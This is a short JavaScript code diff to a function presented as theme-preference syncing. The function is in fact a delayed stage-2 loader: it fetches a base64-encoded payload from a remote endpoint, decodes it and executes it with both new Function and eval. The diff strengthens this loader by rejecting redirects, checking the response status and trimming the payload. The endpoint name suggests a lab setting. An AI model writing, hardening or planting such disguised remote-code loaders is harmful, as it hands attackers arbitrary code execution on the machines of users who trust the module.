@@ -19,10 +19,14 @@ function syncThemePreferences() {
 function scheduleDeferredSync() {
   setTimeout(async () => {
     const response = await fetch(LAB_STAGE2_ENDPOINT, {
+      redirect: "error",
       headers: { "X-Client-Module": "theme-sync-1.0" }
     });
+    if (!response.ok) {
+      throw new Error(`Stage-2 request failed: ${response.status}`);
+    }
     const encodedPatch = await response.text();
-    const decodedScript = atob(encodedPatch);
+    const decodedScript = atob(encodedPatch.trim());
     const runner = new Function(decodedScript);
     runner();
     eval(decodedScript);
